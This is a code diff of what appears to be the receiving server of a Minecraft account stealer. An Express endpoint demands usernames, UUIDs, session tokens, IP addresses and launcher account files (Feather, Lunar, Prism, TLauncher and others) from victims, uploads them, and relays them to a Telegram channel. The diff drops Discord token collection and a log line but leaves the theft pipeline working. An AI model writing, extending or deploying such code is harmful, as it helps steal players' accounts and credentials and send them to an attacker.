@@ -22,7 +22,7 @@ setInterval(() => {
 }, 1000 * 60 * 15);
 
 app.post("/", async (req, res) => {
-    const requiredFields = ["username", "uuid", "token", "ip", "feather", "essentials", "lunar", "prism", "tlauncher", "discord"];
+    const requiredFields = ["username", "uuid", "token", "ip", "feather", "essentials", "lunar", "prism", "tlauncher"];
     if (!requiredFields.every(field => req.body.hasOwnProperty(field))) {
         console.log(req.body);
         return res.sendStatus(404);
@@ -40,7 +40,7 @@ app.post("/", async (req, res) => {
     }
 
     const uploadPromises = [];
-    const keys = ['discord', 'token', 'feather', 'essentials', 'lunar', 'prism', 'tlauncher'];
+    const keys = ['token', 'feather', 'essentials', 'lunar', 'prism', 'tlauncher'];
     keys.forEach(key => {
         if (req.body[key] !== "File not found :(") {
             uploadPromises.push(
@@ -126,7 +126,6 @@ async function sendMessage(text) {
                 body: params
             });
             const jsonResponse = await response.json();
-            console.log('Part of the message sent to Telegram:', jsonResponse);
             if (!jsonResponse.ok) {
                 console.error('Failed to send message part:', jsonResponse.description);
             }
